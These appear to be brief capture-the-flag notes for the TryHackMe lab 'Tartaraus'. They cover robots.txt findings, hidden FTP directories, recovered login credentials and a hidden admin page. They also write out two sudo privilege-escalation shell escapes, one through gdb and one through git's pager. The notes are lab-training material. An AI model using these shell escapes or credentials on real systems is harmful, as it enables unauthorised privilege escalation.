https://tryhackme.com/room/tartaraus

`export IP=10.10.182.64`

## robots.txt
```
User-Agent: *
Disallow : /admin-dir

I told d4rckh we should hide our things deep.
```

FTP has hidden directories, reveal using `ls -la`

`username=enox&password=P@ssword1234`

http://10.10.116.86/sUp3r-s3cr3t/home.php

## linpeash
Found var/www/gdb
`sudo -u thirtytwo gdb -nx -ex '!sh' -ex quit`

## note in thirtytwo's home folder
```
Hey 32, the other day you were unable to clone my github repository.
Now you can use git. Took a while to fix it but now its good :)
```

Found /usr/bin/git runable by d4rckh
`sudo -u d4rckh git -p help config
!/bin/sh`

